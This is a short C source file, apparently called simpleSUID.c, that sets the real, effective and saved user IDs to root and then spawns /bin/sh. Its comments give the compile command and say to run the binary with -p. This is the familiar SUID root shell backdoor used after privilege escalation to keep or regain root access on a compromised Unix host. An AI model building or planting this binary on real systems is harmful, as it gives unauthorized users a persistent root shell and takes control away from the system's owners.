#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
int main(void){
    setresuid(0,0,0);
    system("/bin/sh");
}
// gcc simpleSUID.c -o binaryName
// run with: ./binaryName -p
